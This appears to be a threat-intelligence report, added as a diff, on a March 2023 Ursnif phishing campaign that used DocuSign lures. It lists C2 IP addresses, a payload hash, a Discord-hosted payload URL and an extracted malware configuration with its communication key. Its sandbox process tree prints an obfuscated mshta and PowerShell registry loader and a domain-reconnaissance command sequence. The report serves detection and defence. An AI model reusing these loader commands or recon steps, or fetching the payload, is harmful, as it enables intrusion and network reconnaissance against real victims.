@@ -1,0 +1,218 @@
+Ursnif "20000" | OneDrive URLs | "leahstravelist" | 2 March 2023
+
+
+
+---------------------------------------------------------------
+Malware
+---------------------------------------------------------------
+Ursnif
+
+---------------------------------------------------------------
+Threat Actor
+---------------------------------------------------------------
+TA579
+
+---------------------------------------------------------------
+IOCs
+---------------------------------------------------------------
+Ursnif C2:
+ type: c2
+ urls:
+ - http://185.189.151.250
+ - http://45.11.181.117
+ - http://194.76.225.110
+ - http://194.76.227.187
+ - http://109.230.199.106
+ - http://45.11.180.110
+ - http://185.219.220.150
+ - http://79.132.132.247
+
+Executable Hash:
+ type: payload
+ sha256s:
+ - a240d325f163f4dd9e3ea176d85a1f0864b31efe774402f3cd03c27ea15a4ae1
+
+PDF Payload:
+ type: payload 
+ urls:
+ - https://cdn.discordapp.com/attachments/984846208835133444/1075732659776524348/required_documents.zip
+
+
+---------------------------------------------------------------
+Description
+---------------------------------------------------------------
+Messages purporting to be from sender "leahstravelist.com" with subjects:
+
+- DocuSign Documents
+- DocuSign Documents sent
+
+These messages contain URLs leading to the download of of of the following:
+
+- a zip file hosted on OneDrive. The zip contains an executable used to start Ursnif.
+- a PDF file hosted on OneDrive. The PDF contains a link to the download of a zipped IMG hosted on Discord.The zip is password protected. The password provided in the email body was incorrect.
+
+Example Process Tree:
+<pre>C:\Windows\System32\RuntimeBroker.exe
+C:\Windows\System32\RuntimeBroker.exe -Embedding
+
+C:\Windows\Explorer.EXE
+C:\Windows\Explorer.EXE
+
+C:\Users\Admin\AppData\Local\Temp\documents7.exe
+"C:\Users\Admin\AppData\Local\Temp\documents7.exe"
+
+C:\Windows\System32\mshta.exe
+"C:\Windows\System32\mshta.exe" "about:<hta:application><script>Sd9r='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Sd9r).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\EB212225-4E4E-5501-B04F-6259E4F3B69D\\\BookVirtual'));if(!window.flag)close()</script>"
+
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" new-alias -name kmrrndgw -value gp; new-alias -name oohtykbw -value iex; oohtykbw ([System.Text.Encoding]::ASCII.GetString((kmrrndgw "HKCU:Software\AppDataLow\Software\Microsoft\EB212225-4E4E-5501-B04F-6259E4F3B69D").FolderProcess))
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\ttwswaew\ttwswaew.cmdline"
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RES5E7.tmp" "c:\Users\Admin\AppData\Local\Temp\ttwswaew\CSC5A3E9F65A2B747668B7CDA0D4C94A83.TMP"
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\tmn41l2v\tmn41l2v.cmdline"
+
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RES76D.tmp" "c:\Users\Admin\AppData\Local\Temp\tmn41l2v\CSC1A5BD543FC4743A59B9FE8FA58B267E8.TMP"
+
+C:\Windows\System32\cmd.exe
+"C:\Windows\System32\cmd.exe" /C ping localhost -n 5 && del "C:\Users\Admin\AppData\Local\Temp\documents7.exe"
+
+C:\Windows\system32\PING.EXE
+ping  localhost -n 5 
+
+C:\Windows\syswow64\cmd.exe
+"C:\Windows\syswow64\cmd.exe" /C pause dll mail, , 
+
+C:\Windows\system32\cmd.exe
+cmd /C "wmic computersystem get domain |more > C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\more.com
+more  
+
+C:\Windows\System32\Wbem\WMIC.exe
+wmic  computersystem get domain 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "systeminfo.exe > C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\systeminfo.exe
+systeminfo.exe  
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "net view >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\net.exe
+net  view 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "nslookup 127.0.0.1 >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\nslookup.exe
+nslookup  127.0.0.1 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "tasklist.exe /SVC >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\tasklist.exe
+tasklist.exe  /SVC 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "driverquery.exe >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\driverquery.exe
+driverquery.exe  
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\reg.exe
+reg.exe  query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "net config workstation >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\net.exe
+net  config workstation 
+
+C:\Windows\system32\net1.exe
+C:\Windows\system32\net1  config workstation 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "nltest /domain_trusts >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\nltest.exe
+nltest  /domain_trusts 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "nltest /domain_trusts /all_trusts >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\nltest.exe
+nltest  /domain_trusts /all_trusts 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "net view /all /domain >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\net.exe
+net  view /all /domain 
+
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\cmd.exe
+cmd /C "net view /all >> C:\Users\Admin\AppData\Local\Temp\AFC2.bin1"
+
+C:\Windows\system32\net.exe
+net  view /all </pre>
+
+Example Ursnif Configuration:
+<pre>C2: https://checklistg.google.com
+C2: http://185.189.151.250
+C2: https://edge14.microsoft.com
+C2: http://45.11.181.117
+C2: http://194.76.225.110
+C2: http://194.76.227.187
+C2: http://109.230.199.106
+C2: http://45.11.180.110
+C2: http://185.219.220.150
+C2: http://79.132.132.247
+CommunicationKey: 9A40B27883517C04108397309E6541D8
+CommunicationKeyAlgo: AES128
+Key: U1qXOumoJldByTUP
+Server: 50
+BotnetID: 20000
+IP_Service: http://ipinfo.io/ip http://curlmyip.net</pre>
